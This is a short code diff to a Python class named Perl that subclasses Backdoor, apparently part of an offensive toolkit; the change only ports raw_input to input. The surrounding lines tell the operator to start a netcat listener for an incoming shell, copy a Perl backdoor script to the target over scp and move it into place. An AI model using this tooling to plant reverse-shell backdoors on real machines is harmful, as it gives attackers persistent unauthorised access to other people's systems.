@@ -35,7 +35,7 @@ class Perl(Backdoor):
         fileToWrite.write(stringToAdd)
         fileToWrite.close()
 
-        raw_input("Run the following command: nc -v -n -l -p %s in another shell to start the listener." % port)
+        input("Run the following command: nc -v -n -l -p %s in another shell to start the listener." % port)
         target.scpFiles(self, 'backdoors/shell/perl/prsA.pl', False)
         print("Moving the backdoor script.")
 
